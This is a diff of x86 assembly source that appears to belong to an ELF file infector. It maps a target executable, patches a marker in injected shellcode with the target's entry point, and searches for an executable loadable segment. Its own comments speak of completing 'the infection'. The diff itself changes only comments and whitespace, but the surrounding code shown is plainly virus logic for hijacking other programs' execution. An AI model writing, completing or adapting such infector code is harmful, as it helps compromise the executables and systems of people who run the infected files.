@@ -1,4 +1,4 @@
-;openx flag value
+;open flag value
 %define O_RDONLY 0
 %define O_RDWR 2
 
@@ -269,8 +269,8 @@ mapping:
 	cmp eax, -1
 	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
 	; we know if we should unmap them before exiting, for that I'll use ebx
-	; pivot wasn't mapped -> ebx = 0
-	; elf wasn't mapped -> ebx = 1
+	; pivot wasn't mapped -> ebx = 1
+	; elf wasn't mapped -> ebx = 0
 	jne next_map
 	xor ebx, ebx
 	jmp mmap_err
@@ -350,7 +350,7 @@ patching:
 	push eax; shellcode
 	push dword[shellcode_size]
 	push 0x69696969 	; the DOWRD to replace in the shellcode
- 	;push the entry point ; AKA the value we'd replace the above value with
+ 	;push the entry point	; AKA the value we'd replace the above value with
 	mov eax, [pivot_data]
 	add eax, e_entry
 	push dword[eax];
@@ -359,7 +359,7 @@ patching:
 	test eax, eax
 	jns segments
 	push ERR_NO_MARKER
-	jmp clean	; marker wasn't found -> we can't complete the infection
+	jmp clean		; marker wasn't found -> we can't complete the infection
 
 
 segments:
@@ -368,7 +368,7 @@ segments:
 	mov eax, [pivot_data]
 	mov ebx, [eax + e_phoff] ; we need eax to stay the same for a while
 	add ebx, eax
-	sub ebx, Elf32_Phdr_size; pointer to the program headers's base - 1 * Elf32_Phdr_size
+	sub ebx, Elf32_Phdr_size ; pointer to the program headers's base - 1 * Elf32_Phdr_size
 
 	; getting p_phunm
 	mov cx, word[eax + e_phnum]
@@ -380,16 +380,16 @@ next_segment:
 	dec ecx
 	js no_segment
 
-	add ebx, Elf32_Phdr_size ; ++segment
+	add ebx, Elf32_Phdr_size	; ++segment
 
 
-	mov edx, [ebx + p_type] ; checking the segment type
+	mov edx, [ebx + p_type]		; checking the segment type
 	and edx, PT_LOAD
-	je next_segment ; not loadable
+	je next_segment 		; not loadable
 
-	mov edx, [ebx + p_flags] ; checking the segment flags
+	mov edx, [ebx + p_flags] 	; checking the segment flags
 	and edx, PF_X
-	je next_segment	; not executable
+	je next_segment			; not executable
 
 	jmp segment_found
 
